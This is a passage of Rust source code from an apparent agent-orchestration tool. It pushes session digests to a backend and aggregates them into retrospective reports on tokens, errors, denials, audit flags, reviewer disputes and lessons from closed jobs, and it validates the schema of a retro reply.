fn config_device(home: &Path) -> Res<String> {
    let config = home.join("config.md");
    if !config.is_file() {
        return Ok(String::new());
    }
    let meta = frontmatter(&config)
        .map_err(|e| fail(os_error(&e, Some(&config)), 1))?
        .0;
    Ok(fm_get(&meta, "device").unwrap_or("").to_string())
}

/// PUT this host's digest to the Worker under its device name and today's local date.
pub(crate) fn retro_push() -> Res<()> {
    let home = factory_home()?;
    let config = home.join("config.md");
    let device = config_device(&home)?;
    let hint = format!(
        "set device: in {}; pair this host with factory.py host pair <id> <code>",
        config.display()
    );
    if !HOST_NAME.is_full(&device) {
        return Err(fail(hint, 2));
    }
    let (rows, date) = (rows(1)?, local_today());
    let key = format!("retro/{device}/{date}.jsonl");
    let body: String = rows.iter().map(|r| dumps(r, DEFAULT) + "\n").collect();
    let r = api(
        &home,
        "PUT",
        &format!("/api/{key}"),
        Some(body.as_bytes()),
        &[200, 403],
        &[("Content-Type", "application/x-ndjson")],
    )?;
    push_outcome(r.status, &r.text()?, &hint, &home.join(".env"))?;
    let record = dumps(&json!({"version": 1, "date": date}), DEFAULT) + "\n";
    let path = home.join(RETRO_PUSH_FILE);
    write_atomic(&path, record.as_bytes()).map_err(|e| fail(os_error(&e, Some(&path)), 1))?;
    println!("pushed {} sessions to {key}", rows.len());
    Ok(())
}

/// Fails on the Worker's two 403 answers to a digest PUT.
fn push_outcome(status: u16, text: &str, hint: &str, env: &Path) -> Res<()> {
    if status == 403 && strip(text) == RETRO_WRITE_ONLY {
        return Err(fail(format!("{RETRO_WRITE_ONLY}. {hint}"), 2));
    }
    if status == 403 {
        return Err(fail(access_message(env), 5));
    }
    Ok(())
}

/// A GET of a Worker path with its ok statuses.
type Get<'a> = dyn FnMut(&str, &[u16]) -> Res<Response> + 'a;

/// `json.loads` for transcript and digest lines: an unpaired UTF-16 surrogate escape, which Python
/// accepts, is read as U+FFFD here rather than dropped as the shared `loads` drops it.
fn loads_lenient(text: &str) -> Result<Value, serde_json::Error> {
    {
        let chars: Vec<char> = text.chars().collect();
        let escape = |i: usize| -> Option<u32> {
            if chars.get(i..i + 2)? != ['\\', 'u'] {
                return None;
            }
            u32::from_str_radix(&chars.get(i + 2..i + 6)?.iter().collect::<String>(), 16).ok()
        };
        let (mut out, mut i) = (String::with_capacity(text.len()), 0);
        let mut changed = false;
        while i < chars.len() {
            if chars[i] != '\\' {
                out.push(chars[i]);
                i += 1;
                continue;
            }
            match escape(i) {
                Some(0xD800..=0xDBFF) if matches!(escape(i + 6), Some(0xDC00..=0xDFFF)) => {
                    out.extend(&chars[i..i + 12]);
                    i += 12;
                }
                Some(0xD800..=0xDFFF) => {
                    out.push_str("\\ufffd");
                    changed = true;
                    i += 6;
                }
                _ => {
                    out.extend(chars.get(i..i + 2).unwrap_or(&chars[i..]));
                    i += 2;
                }
            }
        }
        if changed {
            loads(&out)
        } else {
            loads(text)
        }
    }
}

fn json_of(text: &str) -> Res<Value> {
    loads(text).map_err(|e| fail(format!("the Worker sent JSON that does not parse: {e}"), 1))
}

/// What a Python for loop walks over a parsed value: list items, dict keys or string characters.
fn py_iter(v: &Value) -> Res<Vec<Value>> {
    Ok(match v {
        Value::Array(items) => items.clone(),
        Value::Object(map) => map.keys().map(|k| json!(k)).collect(),
        Value::String(s) => s.chars().map(|c| json!(c.to_string())).collect(),
        other => return Err(fail(format!("{} is not iterable", py_repr(other)), 1)),
    })
}

/// (host, text) for every host's pushed digest for date, in the order the Worker lists the hosts.
fn fetch(date: &str, get: &mut Get) -> Res<Vec<(String, String)>> {
    let listed = json_of(&get(&format!("/api/retro/{date}"), &[200])?.text()?)?;
    let hosts: Vec<String> = py_iter(&listed)?
        .into_iter()
        .filter_map(|h| {
            h.as_str()
                .filter(|h| HOST_NAME.is_full(h))
                .map(str::to_string)
        })
        .collect();
    let mut out = Vec::new();
    for host in hosts {
        let text = get(&format!("/api/retro/{host}/{date}.jsonl"), &[200])?.text()?;
        out.push((host, text));
    }
    Ok(out)
}

/// Print every host's pushed digest for date, in the order the Worker lists the hosts.
fn pull(date: &str) -> Res<()> {
    let home = factory_home()?;
    let pushed = fetch(date, &mut |p, ok| api(&home, "GET", p, None, ok, &[]))?;
    if pushed.is_empty() {
        eprintln!("no host pushed a retro digest for {date}");
    }
    for (_, text) in pushed {
        print!("{text}");
    }
    Ok(())
}

/// `retro_dict`: the value's object, or none.
fn dict_of(v: Option<&Value>) -> Option<&Map<String, Value>> {
    v.and_then(Value::as_object)
}

/// Add counts' whole-number values into total, key by key.
fn sum_into(total: &mut Map<String, Value>, counts: Option<&Value>) {
    for (key, value) in dict_of(counts).into_iter().flatten() {
        let n = int_of(total.get(key)) + int_of(Some(value));
        total.insert(key.clone(), json!(n));
    }
}

/// `host/session` for a digest row.
fn session_ref(row: &Value) -> String {
    format!("{}/{}", py_str(&row["host"]), py_str(&row["session"]))
}

/// refs without repeats, in first-seen order, at most limit of them.
fn unique(refs: impl IntoIterator<Item = String>, limit: usize) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for r in refs {
        if !out.contains(&r) {
            out.push(r);
        }
    }
    out.truncate(limit);
    out
}

/// The digest refs of a job number on any host.
fn job_refs(rows: &[Value], number: &str) -> Vec<String> {
    unique(
        rows.iter()
            .filter(|r| py_str(r.get("job").unwrap_or(&Value::Null)) == number)
            .map(session_ref),
        usize::MAX,
    )
}

/// The part of a job id before its first -.
fn job_number(id: &Value) -> String {
    py_str(id).split('-').next().unwrap().to_string()
}

fn header_int(r: &Response, name: &str) -> Res<i64> {
    let value = r
        .header(name)
        .ok_or_else(|| fail(format!("the Worker sent no {name}"), 1))?;
    strip(value)
        .parse()
        .map_err(|_| fail(format!("{name} is not a number: {value}"), 1))
}

/// The top 20 {"text", "count", "sessions"} entries merged from each row's pick(row) counts.
fn patterns(rows: &[Value], pick: impl Fn(&Value) -> Option<&Value>) -> Vec<Value> {
    let mut merged: Vec<(String, i64, Vec<String>)> = Vec::new();
    for row in rows {
        for (text, n) in dict_of(pick(row)).into_iter().flatten() {
            let at = match merged.iter().position(|(t, ..)| t == text) {
                Some(at) => at,
                None => {
                    merged.push((text.clone(), 0, Vec::new()));
                    merged.len() - 1
                }
            };
            let entry = &mut merged[at];
            entry.1 += int_of(Some(n));
            let r = session_ref(row);
            if entry.2.len() < 5 && !entry.2.contains(&r) {
                entry.2.push(r);
            }
        }
    }
    merged.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
    merged
        .into_iter()
        .take(20)
        .map(|(text, count, sessions)| json!({"text": text, "count": count, "sessions": sessions}))
        .collect()
}

/// The red-flag index rows without an ack whose job is a board job of a registered project, in index
/// order, each with that project and up to 5 digest refs of the same job on the same host. A row whose
/// tool or any flag name is not a plain RETRO_FLAG_NAME string is dropped.
fn red_flags(index: &Value, board: &Value, projects: &[String], rows: &[Value]) -> Vec<Value> {
    let jobs = board["jobs"]
        .as_array()
        .map(Vec::as_slice)
        .unwrap_or_default();
    let owner = |job: Option<&Value>| {
        let job = job.unwrap_or(&Value::Null);
        jobs.iter()
            .rev()
            .find(|j| j.get("id").unwrap_or(&Value::Null) == job)
            .and_then(|j| j.get("project"))
            .and_then(Value::as_str)
            .filter(|p| projects.iter().any(|q| q == p))
    };
    let mut out = Vec::new();
    let listed = dict_of(Some(index)).and_then(|m| m.get("rows"));
    for flag in listed.and_then(Value::as_array).into_iter().flatten() {
        let Some(f) = flag.as_object() else { continue };
        let Some(project) = owner(f.get("job")) else {
            continue;
        };
        if f.contains_key("ack") {
            continue;
        }
        let plain = |v: Option<&Value>| {
            v.and_then(Value::as_str)
                .is_some_and(|s| RETRO_FLAG_NAME.is_full(s))
        };
        let names = f.get("flags").and_then(Value::as_array);
        if !(plain(f.get("tool")) && names.is_some_and(|n| n.iter().all(|n| plain(Some(n))))) {
            continue;
        }
        let number = job_number(&f["job"]);
        let host = f.get("host").unwrap_or(&Value::Null);
        let refs = unique(
            rows.iter()
                .filter(|r| {
                    &r["host"] == host && py_str(r.get("job").unwrap_or(&Value::Null)) == number
                })
                .map(session_ref),
            5,
        );
        let get = |k: &str| f.get(k).cloned().unwrap_or(Value::Null);
        out.push(json!({"time": get("time"), "job": f["job"], "project": project, "host": get("host"),
                        "agent": get("agent"), "tool": get("tool"), "flags": get("flags"), "target": get("target"),
                        "sessions": refs}));
    }
    out
}

/// A repeated-finding row for each valid entry of the job's repeated list from the window start on, at any
/// stage. sessions holds up to 5 digest refs of the job on any host.
fn repeated(job: &Value, rows: &[Value], since: &str) -> Vec<Value> {
    let refs: Vec<String> = job_refs(rows, &job_number(&job["id"]))
        .into_iter()
        .take(5)
        .collect();
    let mut out = Vec::new();
    for r in job
        .get("repeated")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        let valid = r.is_object()
            && r.get("reviewer")
                .and_then(Value::as_str)
                .is_some_and(|v| TRACER_REVIEWERS.contains(&v))
            && r.get("signature")
                .and_then(Value::as_str)
                .is_some_and(|s| REPEATED_SIGNATURE.is_full(s))
            && ["round", "first"].iter().all(|k| {
                r.get(*k)
                    .is_some_and(|v| is_int(v) && v.as_f64().unwrap() >= 1.0)
            })
            && r.get("at")
                .and_then(Value::as_str)
                .is_some_and(|at| cut(at, 10).as_str() >= since);
        if !valid {
            continue;
        }
        out.push(json!({
            "job": job["id"], "project": job["project"], "kind": "repeated-finding",
            "title": printable_line(&py_str(job.get("title").unwrap_or(&json!(""))), 120),
            "reason": format!("{} repeated {} from round {} in round {}", py_str(&r["reviewer"]),
                              py_str(&r["signature"]), py_str(&r["first"]), py_str(&r["round"])),
            "at": r["at"], "sessions": refs, "reviewer": r["reviewer"], "signature": r["signature"],
        }));
    }
    out
}

/// Lessons from jobs of registered projects since the window start, newest first, at most RETRO_LESSONS_MAX.
fn lessons(board: &Value, projects: &[String], rows: &[Value], since: &str) -> Vec<Value> {
    let mut out = Vec::new();
    for j in board["jobs"].as_array().into_iter().flatten() {
        if !j
            .get("project")
            .and_then(Value::as_str)
            .is_some_and(|p| projects.iter().any(|q| q == p))
        {
            continue;
        }
        out.extend(repeated(j, rows, since));
        let done = j.get("done").and_then(Value::as_str);
        if j.get("stage") != Some(&json!("closed"))
            || !done.is_some_and(|d| cut(d, 10).as_str() >= since)
        {
            continue;
        }
        let backlog = dict_of(j.get("backlog"));
        let (kind, raw) = if backlog.and_then(|b| b.get("decision")) == Some(&json!("denied")) {
            ("denied", backlog.and_then(|b| b.get("notes")))
        } else if j.get("pr").is_some_and(Value::is_string) {
            let reason = dict_of(j.get("close")).and_then(|c| c.get("reason"));
            (
                "pr-closed",
                if truthy(reason) {
                    reason
                } else {
                    j.get("note")
                },
            )
        } else {
            continue;
        };
        let reason = raw
            .and_then(Value::as_str)
            .map_or(String::new(), |r| printable_line(r, 300));
        if reason.is_empty() || check_text(&json!(reason), 1, 300, false).is_some() {
            continue;
        }
        out.push(json!({
            "job": j["id"], "project": j["project"], "kind": kind,
            "title": printable_line(&py_str(j.get("title").unwrap_or(&json!(""))), 120), "reason": reason,
            "at": j["done"], "sessions": job_refs(rows, &job_number(&j["id"])).into_iter().take(5).collect::<Vec<_>>(),
        }));
    }
    out.sort_by(|a, b| b["at"].as_str().cmp(&a["at"].as_str()));
    out.truncate(RETRO_LESSONS_MAX);
    out
}

/// The Signature: lines of a CHANGES review's text, or none for any other review.
fn changes_signatures(text: &str) -> BTreeSet<String> {
    let lines = splitlines(text, false);
    if lines.first() != Some(&"VERDICT: CHANGES") {
        return BTreeSet::new();
    }
    lines
        .iter()
        .filter_map(|line| {
            SIGNATURE
                .fullmatch(strip(line))
                .map(|c| group(&c, 1).to_string())
        })
        .collect()
}

/// (round, reviewer, signature) for every Disputed findings row in build.md, across all run sections.
fn build_disputes(text: &str) -> BTreeSet<(usize, String, String)> {
    splitlines(text, false)
        .iter()
        .filter_map(|line| {
            let c = DISPUTE_ROW.match_start(strip(line))?;
            Some((
                group(&c, 1).parse().ok()?,
                group(&c, 2).to_string(),
                group(&c, 3).to_string(),
            ))
        })
        .collect()
}

/// Per reviewer, the CHANGES findings in jobs of registered projects merged or closed since the window start,
/// and how many the builder disputed in build.md's Disputed findings table.
fn reviewers(
    board: &Value,
    projects: &[String],
    rows: &[Value],
    since: &str,
    get: &mut Get,
) -> Res<Value> {
    let mut jobs: Vec<&Value> = board["jobs"]
        .as_array()
        .into_iter()
        .flatten()
        .filter(|j| {
            ["merged", "closed"]
                .iter()
                .any(|s| j.get("stage") == Some(&json!(s)))
                && j.get("done")
                    .and_then(Value::as_str)
                    .is_some_and(|d| cut(d, 10).as_str() >= since)
                && j.get("project")
                    .and_then(Value::as_str)
                    .is_some_and(|p| projects.iter().any(|q| q == p))
        })
        .collect();
    jobs.sort_by(|a, b| b["done"].as_str().cmp(&a["done"].as_str()));
    jobs.truncate(RETRO_MERGED_MAX);
    // changes, disputed, jobs, counts per project, sessions.
    let mut stats: Vec<(i64, i64, i64, Vec<(String, i64)>, Vec<String>)> = REVIEWERS
        .iter()
        .map(|_| (0, 0, 0, Vec::new(), Vec::new()))
        .collect();
    for j in jobs {
        let base = format!("/api/jobs/{}/{}", py_str(&j["project"]), py_str(&j["id"]));
        let mut found: Vec<((usize, &str), BTreeSet<String>)> = Vec::new();
        for (i, e) in j
            .get("rounds")
            .and_then(Value::as_array)
            .into_iter()
            .flatten()
            .enumerate()
        {
            if !e.is_object() {
                continue;
            }
            for r in REVIEWERS {
                if e.get(*r) == Some(&json!("CHANGES")) {
                    let got = get(
                        &format!("{base}/round-{}/review-{r}.md", i + 1),
                        &[200, 404],
                    )?;
                    if got.status == 200 {
                        found.push(((i + 1, r), changes_signatures(&got.text()?)));
                    }
                }
            }
        }
        if found.iter().all(|(_, sigs)| sigs.is_empty()) {
            continue;
        }
        let got = get(&format!("{base}/build.md"), &[200, 404])?;
        let disputes = if got.status == 200 {
            build_disputes(&got.text()?)
        } else {
            BTreeSet::new()
        };
        let refs = job_refs(rows, &job_number(&j["id"]));
        for (at, r) in REVIEWERS.iter().enumerate() {
            let signed: Vec<(usize, &String)> = found
                .iter()
                .filter(|((_, reviewer), _)| reviewer == r)
                .flat_map(|((n, _), sigs)| sigs.iter().map(move |s| (*n, s)))
                .collect();
            if signed.is_empty() {
                continue;
            }
            let hits = signed
                .iter()
                .filter(|(n, s)| disputes.contains(&(*n, r.to_string(), s.to_string())))
                .count() as i64;
            let st = &mut stats[at];
            st.0 += signed.len() as i64;
            st.1 += hits;
            st.2 += 1;
            let project = py_str(&j["project"]);
            match st.3.iter_mut().find(|(p, _)| *p == project) {
                Some(slot) => slot.1 += 1,
                None => st.3.push((project, 1)),
            }
            if hits > 0 {
                st.4 = unique(st.4.iter().cloned().chain(refs.iter().cloned()), 5);
            }
        }
    }
    let mut out = Map::new();
    for (r, (n, disputed, jobs, counts, sessions)) in REVIEWERS.iter().zip(stats) {
        let accept = (n > 0).then(|| round_int(100.0 * (n - disputed) as f64 / n as f64));
        let project = counts
            .iter()
            .min_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)))
            .map(|(p, _)| p.clone());
        out.insert(
            r.to_string(),
            json!({"changes": n, "fixed": n - disputed, "disputed": disputed, "accept_pct": accept,
                   "jobs": jobs, "project": project, "sessions": sessions}),
        );
    }
    Ok(Value::Object(out))
}

fn registered(get: &mut Get) -> Res<BTreeSet<String>> {
    let listed = json_of(&get("/projects.json", &[200])?.text()?)?;
    py_iter(&listed)?
        .iter()
        .map(|p| {
            p.get("slug")
                .and_then(Value::as_str)
                .map(str::to_string)
                .ok_or_else(|| fail("projects.json lists a project without a text slug", 1))
        })
        .collect()
}

/// The board's autonomy record with defaults filled in. A malformed record counts as paused.
fn load_autonomy(data: &Value) -> Value {
    let default = json!({"paused": true, "projects": [], "self": []});
    let empty = Map::new();
    let stored = match data.get("autonomy") {
        None => Some(&empty),
        Some(v) => v.as_object(),
    };
    let mut record = default.clone();
    for (k, v) in stored.into_iter().flatten() {
        record[k] = v.clone();
    }
    let texts = |k: &str| {
        record[k]
            .as_array()
            .is_some_and(|a| a.iter().all(Value::is_string))
    };
    if stored.is_none()
        || !record["paused"].is_boolean()
        || !texts("projects")
        || !texts("self")
        || record["projects"].as_array().unwrap().len() > MAX_EXPLORER_PROJECTS
    {
        eprintln!(
            "factory.py: the board's autonomy record is malformed, so autonomy counts as paused; run autonomy pause to rewrite it"
        );
        return default;
    }
    record
}

/// The hosts the project's effective pipeline runs pickup on, or none when pickup is off or unreadable.
fn pickup_config(slug: &str, get: &mut Get) -> Res<Vec<String>> {
    let r = get(&format!("/api/pipeline/effective/{slug}"), &[200, 404, 409])?;
    if r.status != 200 {
        return Ok(Vec::new());
    }
    let view = loads(&r.text()?).ok();
    let pickup = view.as_ref().and_then(|v| v.get("pickup"));
    let hosts = pickup
        .and_then(|p| p.get("hosts"))
        .and_then(Value::as_array);
    let valid = pickup
        .and_then(|p| p.get("enabled"))
        .is_some_and(Value::is_boolean)
        && hosts.is_some_and(|h| {
            h.iter()
                .all(|h| h.as_str().is_some_and(|h| HOST_NAME.is_full(h)))
        });
    if !valid || pickup.unwrap()["enabled"] != json!(true) {
        return Ok(Vec::new());
    }
    Ok(hosts
        .unwrap()
        .iter()
        .map(|h| h.as_str().unwrap().to_string())
        .collect())
}

/// Pull every host's digest for the last days into <home>/retro/<run>/ for the retro agent.
fn aggregate(days: i64) -> Res<()> {
    let home = factory_home()?;
    let summary = aggregate_in(&home, &local_today(), &run_name(), days, &mut |p, ok| {
        api(&home, "GET", p, None, ok, &[])
    })?;
    println!("{summary}");
    Ok(())
}

/// Writes aggregate.json and digest.jsonl for the window ending today into <home>/retro/<run>/ and
/// returns the indent-2 summary.
fn aggregate_in(home: &Path, today: &str, run: &str, days: i64, get: &mut Get) -> Res<String> {
    let dates: Vec<String> = (0..days)
        .rev()
        .map(|back| shift_date(today, -back))
        .collect();
    let (first, last) = (&dates[0], &dates[dates.len() - 1]);
    let (mut rows, mut skipped, mut latest) =
        (Vec::<Value>::new(), 0, HashMap::<String, String>::new());
    for date in &dates {
        for (host, text) in fetch(date, get)? {
            for line in splitlines(&text, false) {
                let Ok(mut row) = loads_lenient(line) else {
                    skipped += 1;
                    continue;
                };
                let session = row.get("session").and_then(Value::as_str);
                if !row.is_object()
                    || row["host"] != json!(host)
                    || !session.is_some_and(|s| RETRO_SESSION.is_full(s))
                {
                    skipped += 1;
                    continue;
                }
                if row["job"] == json!("ad-hoc") {
                    row["project"] = json!("ad-hoc");
                }
                rows.push(row);
                latest.insert(host.clone(), date.clone());
            }
        }
    }
    if rows.is_empty() {
        return Err(fail(
            format!("no host pushed a retro digest from {first} to {last}"),
            3,
        ));
    }
    let projects: Vec<String> = registered(get)?.into_iter().collect();
    let board = load_board(Some(&get("/api/board", &[200])?.text()?))?;
    let allow = load_autonomy(&board)["projects"].clone();
    let mut pipeline = Map::new();
    let scopes = std::iter::once("global".to_string())
        .chain(projects.iter().map(|p| format!("projects/{p}")));
    for scope in scopes {
        let r = get(&format!("/api/pipeline/{scope}"), &[200, 404])?;
        let (version, notes) = if r.status == 200 {
            let notes = json_of(&r.text()?)?
                .get("stage_notes")
                .cloned()
                .unwrap_or(json!({}));
            (header_int(&r, "X-Pipeline-Version")?, notes)
        } else {
            (0, json!({}))
        };
        pipeline.insert(scope, json!({"version": version, "stage_notes": notes}));
    }
    let mut expected = BTreeSet::new();
    for p in &projects {
        expected.extend(pickup_config(p, get)?);
    }
    let mut documents = Map::new();
    for slug in allow.as_array().unwrap().iter().map(py_str) {
        for name in std::iter::once("project.md").chain(DOCUMENT_NAMES.iter().copied()) {
            let r = get(&format!("/api/project-history/{slug}/{name}"), &[200, 404])?;
            let versions = if r.status == 200 {
                json_of(&r.text()?)?
            } else {
                json!([])
            };
            let route = if name == "project.md" {
                format!("/api/projects/{slug}.md")
            } else {
                format!("/api/project-documents/{slug}/{name}")
            };
            let r = get(&route, &[200, 404])?;
            if r.status == 200 {
                let version = if truthy(Some(&versions)) {
                    versions[0]["version"].clone()
                } else {
                    json!(0)
                };
                documents.insert(
                    format!("{slug}/{name}"),
                    json!({"version": version, "text": r.text()?}),
                );
            }
        }
    }
    let folder = home.join("retro").join(run);
    let link = |p: &Path| is_link(p).map_err(|e| fail(os_error(&e, Some(p)), 1));
    if link(folder.parent().unwrap())? || link(&folder)? {
        return Err(fail(
            format!(
                "{} or its parent is a link; nothing written",
                folder.display()
            ),
            2,
        ));
    }
    let (mut hosts, mut host_jobs) = (Map::new(), HashMap::<String, BTreeSet<String>>::new());
    let (mut subagents, mut firsts, mut sub, mut attachments) = (
        Map::new(),
        HashMap::<String, Vec<i64>>::new(),
        Map::new(),
        Map::new(),
    );
    for row in &rows {
        let name = py_str(&row["host"]);
        let h = hosts
            .entry(name.clone())
            .or_insert_with(|| json!({"sessions": 0, "jobs": 0, "ad_hoc": 0}));
        h["sessions"] = json!(int_of(h.get("sessions")) + 1);
        let jobs = host_jobs.entry(name).or_default();
        if row["job"] == json!("ad-hoc") {
            h["ad_hoc"] = json!(int_of(h.get("ad_hoc")) + 1);
        } else {
            jobs.insert(py_str(row.get("job").unwrap_or(&Value::Null)));
        }
        let by_type = dict_of(dict_of(row.get("subagents")).and_then(|s| s.get("by_type")));
        for (kind, t) in by_type.into_iter().flatten() {
            let t = dict_of(Some(t));
            let field = |k: &str| t.and_then(|t| t.get(k));
            let s = subagents.entry(kind.clone()).or_insert_with(
                || json!({"count": 0, "turns": 0, "errors": 0, "denials": 0, "tokens": {}}),
            );
            for key in ["count", "turns", "errors", "denials"] {
                s[key] = json!(int_of(s.get(key)) + int_of(field(key)));
            }
            sum_into(s["tokens"].as_object_mut().unwrap(), field("tokens"));
            sum_into(&mut sub, field("tokens"));
            let firsts = firsts.entry(kind.clone()).or_default();
            for v in field("first_turns")
                .and_then(Value::as_array)
                .into_iter()
                .flatten()
            {
                if is_int(v) && v.as_f64().unwrap() > 0.0 {
                    firsts.push(int_of(Some(v)));
                }
            }
        }
        for (kind, size) in dict_of(row.get("first_turn_attachments"))
            .into_iter()
            .flatten()
        {
            let sizes = attachments.entry(kind.clone()).or_insert_with(|| json!([]));
            sizes
                .as_array_mut()
                .unwrap()
                .push(json!(int_of(Some(size))));
        }
    }
    for (kind, s) in subagents.iter_mut() {
        s["first_turn_median"] = json!(median(firsts.remove(kind).unwrap_or_default()));
    }
    for (name, h) in hosts.iter_mut() {
        h["jobs"] = json!(host_jobs[name].len());
        h["latest"] = json!(latest[name]);
    }
    let host_names: BTreeSet<String> = hosts.keys().cloned().collect();
    let stale: BTreeSet<String> = hosts
        .iter()
        .filter(|(_, h)| h["latest"] != json!(last))
        .map(|(n, _)| n.clone())
        .collect();
    let total = |key: &str, field: Option<&str>| -> i64 {
        rows.iter()
            .map(|r| match field {
                Some(f) => int_of(dict_of(r.get(key)).and_then(|d| d.get(f))),
                None => int_of(r.get(key)),
            })
            .sum()
    };
    let summed = |key: &str| {
        let mut out = Map::new();
        rows.iter().for_each(|r| sum_into(&mut out, r.get(key)));
        out
    };
    let mut rounds = Map::new();
    for row in &rows {
        if row.get("review_round_max").is_some_and(is_int) {
            count(&mut rounds, py_str(&row["review_round_max"]));
        }
    }
    let context = |r: &Value, f: &str| int_of(dict_of(r.get("context")).and_then(|c| c.get(f)));
    let first_turns: Vec<i64> = rows
        .iter()
        .map(|r| context(r, "first_turn"))
        .filter(|v| *v > 0)
        .collect();
    let attachments_median: Map<String, Value> = attachments
        .into_iter()
        .map(|(kind, sizes)| {
            let sizes = sizes
                .as_array()
                .unwrap()
                .iter()
                .map(|v| v.as_i64().unwrap())
                .collect();
            (kind, json!(median(sizes)))
        })
        .collect();
    let transcripts = retro_transcripts().display().to_string();
    let mut agg = json!({
        "schema": "factory.retro-aggregate/1", "run": run, "from": first, "to": last, "host": host(home)?,
        "transcripts": transcripts, "projects": projects, "hosts": hosts,
        "tokens": {"main": summed("tokens"), "subagents": sub},
        "context": {"first_turn_median": median(first_turns),
                    "mean_per_turn_median": median(rows.iter().map(|r| context(r, "mean_per_turn")).collect())},
        "attachments_median": attachments_median, "env_noise": summed("env_noise"), "polls": summed("polls"),
        "denials": {"count": total("denials", Some("count")), "blocked_sleep": total("denials", Some("blocked_sleep")),
                    "patterns": patterns(&rows, |r| dict_of(r.get("denials")).and_then(|d| d.get("patterns")))},
        "errors": {"count": total("errors", Some("count")), "benign": total("errors", Some("benign")),
                   "patterns": patterns(&rows, |r| dict_of(r.get("errors")).and_then(|d| d.get("patterns")))},
        "repeated_cmds": patterns(&rows, |r| r.get("repeated_cmds")),
        "subagents": subagents, "review_rounds": rounds, "agent_prompts": summed("agent_prompts"),
        "human_msgs": total("human_msgs", None), "interrupts": total("interrupts", None), "pipeline": pipeline,
        "documents": documents,
    });
    let mut merged: Vec<Value> = board["jobs"]
        .as_array()
        .into_iter()
        .flatten()
        .filter(|j| {
            j.get("stage") == Some(&json!("merged"))
                && j.get("done").and_then(Value::as_str).is_some_and(|d| &cut(d, 10) >= first)
                && j.get("project").and_then(Value::as_str).is_some_and(|p| projects.iter().any(|q| q == p))
        })
        .map(|j| {
            json!({"id": j["id"], "project": j["project"],
                   "title": cut(&py_str(j.get("title").unwrap_or(&json!(""))), 120), "merged": j["done"]})
        })
        .collect();
    merged.sort_by(|a, b| a["id"].as_str().cmp(&b["id"].as_str()));
    merged.sort_by(|a, b| b["merged"].as_str().cmp(&a["merged"].as_str()));
    merged.truncate(RETRO_MERGED_MAX);
    agg["merged"] = json!(merged);
    let r = get("/api/audit-flags", &[200, 404])?;
    let index = if r.status == 200 {
        json_of(&r.text()?)?
    } else {
        json!({})
    };
    agg["red_flags"] = json!(red_flags(&index, &board, &projects, &rows));
    agg["lessons"] = json!(lessons(&board, &projects, &rows, first));
    agg["reviewers"] = reviewers(&board, &projects, &rows, first, get)?;
    let made = fs::create_dir_all(folder.parent().unwrap()).and_then(|_| fs::create_dir(&folder));
    made.map_err(|e| fail(os_error(&e, Some(&folder)), 1))?;
    let write = |name: &str, text: String| {
        let path = folder.join(name);
        fs::write(&path, text).map_err(|e| fail(os_error(&e, Some(&path)), 1))
    };
    write("aggregate.json", dumps(&agg, INDENT2) + "\n")?;
    write(
        "digest.jsonl",
        rows.iter().map(|r| dumps(r, DEFAULT) + "\n").collect(),
    )?;
    let path = |name: &str| folder.join(name).display().to_string();
    Ok(dumps(
        &json!({"run": run, "from": first, "to": last, "hosts": host_names,
                "expected": expected, "stale": stale, "sessions": rows.len(), "skipped": skipped,
                "dir": folder.display().to_string(), "aggregate": path("aggregate.json"),
                "digest": path("digest.jsonl"), "transcripts": agg["transcripts"], "out": path("reply.json"),
                "findings": path("findings.md")}),
        INDENT2,
    ))
}

/// `x in container` for parsed JSON: list items, dict keys, or a substring of a string.
fn py_in(x: &Value, container: &Value) -> bool {
    match container {
        Value::Array(items) => items.contains(x),
        Value::Object(map) => x.as_str().is_some_and(|k| map.contains_key(k)),
        Value::String(s) => x.as_str().is_some_and(|x| s.contains(x)),
        _ => false,
    }
}

fn check_keys(value: &Value, required: &[&str], optional: &[&str]) -> Option<String> {
    let Some(map) = value.as_object() else {
        return Some("must be an object".into());
    };
    let missing = required.iter().any(|k| !map.contains_key(*k));
    let unknown = map
        .keys()
        .any(|k| !required.contains(&k.as_str()) && !optional.contains(&k.as_str()));
    if !missing && !unknown {
        return None;
    }
    let listed = |keys: &[&str]| {
        let mut keys = keys.to_vec();
        keys.sort();
        format!(
            "[{}]",
            keys.iter().map(|k| repr(k)).collect::<Vec<_>>().join(", ")
        )
    };
    let may = if optional.is_empty() {
        String::new()
    } else {
        format!(", may have {}", listed(optional))
    };
    Some(format!("needs keys {}{may}", listed(required)))
}

fn check_list(value: &Value, lo: usize, hi: usize) -> Option<String> {
    let fits = value
        .as_array()
        .is_some_and(|a| (lo..=hi).contains(&a.len()));
    (!fits).then(|| format!("must be a list of {lo}-{hi} items"))
}

fn check_session_refs(value: &Value) -> Option<String> {
    check_list(value, 1, 5).or_else(|| {
        let bad = value
            .as_array()
            .unwrap()
            .iter()
            .any(|r| !r.as_str().is_some_and(|r| RETRO_SESSION_REF.is_full(r)));
        bad.then(|| "must be host/session refs".into())
    })
}

/// The first reply-level violation of the factory.retro/1 reply as "<where>: <problem>", or None.
fn check_retro(doc: &Value) -> Option<String> {
    if let Some(err) = check_keys(
        doc,
        &["schema", "run", "findings", "suggestions"],
        &["edits", "lesson_cards"],
    ) {
        return Some(format!("reply: {err}"));
    }
    let none = json!([]);
    let checks = [
        (
            "schema",
            (doc["schema"] != json!(RETRO_REPLY_SCHEMA))
                .then(|| format!("must be {RETRO_REPLY_SCHEMA}")),
        ),
        (
            "run",
            (!doc["run"].as_str().is_some_and(|r| RUN_TAG.is_full(r)))
                .then(|| "must match [A-Za-z0-9_-]{1,64}".into()),
        ),
        ("findings", check_list(&doc["findings"], 1, 12)),
        (
            "suggestions",
            check_list(&doc["suggestions"], 0, MAX_PER_RUN),
        ),
        (
            "edits",
            check_list(doc.get("edits").unwrap_or(&none), 0, MAX_RETRO_EDITS),
        ),
        (
            "lesson_cards",
            check_list(doc.get("lesson_cards").unwrap_or(&none), 0, 1),
        ),
    ];
    checks
        .into_iter()
        .find_map(|(at, err)| err.map(|err| format!("{at}: {err}")))
}

/// The characters changed between a and b once their shared prefix and suffix are trimmed:
/// the removed ones plus the added ones. The Worker's changedChars counts the same way.
fn changed_chars(a: &str, b: &str) -> usize {
    let (a, b): (Vec<char>, Vec<char>) = (a.chars().collect(), b.chars().collect());
    let most = a.len().min(b.len());
    let start = (0..most).take_while(|&i| a[i] == b[i]).count();
    let end = (0..most - start)
        .take_while(|&i| a[a.len() - 1 - i] == b[b.len() - 1 - i])
        .count();
